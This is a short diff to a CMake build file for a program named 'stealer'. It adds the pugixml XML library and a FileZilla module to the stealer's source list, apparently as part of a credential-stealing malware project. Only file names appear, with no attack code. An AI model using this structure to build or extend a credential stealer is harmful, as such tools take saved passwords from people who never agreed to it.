@@ -61,6 +61,11 @@ add_executable(stealer src/main.cpp
         src/stealer/StealerModuleGroup.h
         src/stealer/impl/InstalledApps.cpp
         src/stealer/impl/InstalledApps.h
+        include/pugiconfig.hpp
+        include/pugixml.cpp
+        include/pugixml.hpp
+        src/stealer/impl/FileZilla.cpp
+        src/stealer/impl/FileZilla.h
 )
 
 target_link_libraries(stealer
